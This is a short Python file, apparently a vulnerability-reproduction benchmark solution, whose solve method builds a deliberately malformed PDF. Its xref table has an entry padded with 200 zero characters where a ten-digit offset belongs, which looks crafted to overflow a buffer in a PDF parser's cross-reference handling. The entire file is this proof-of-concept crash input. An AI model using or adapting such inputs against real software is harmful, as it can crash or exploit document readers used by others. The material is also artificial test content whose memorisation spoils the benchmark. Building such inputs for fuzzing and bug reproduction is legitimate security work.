import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        header = b"%PDF-1.4\n"
        xref_offset = len(header)
        zeros = b"0" * 200
        parts = [
            header,
            b"xref\n",
            b"0 2\n",
            b"0000000000 65535 f \n",
            zeros,
            b" 00000 n \n",
            b"trailer\n",
            b"<<>>\n",
            b"startxref\n",
            str(xref_offset).encode("ascii"),
            b"\n%%EOF\n",
        ]
        return b"".join(parts)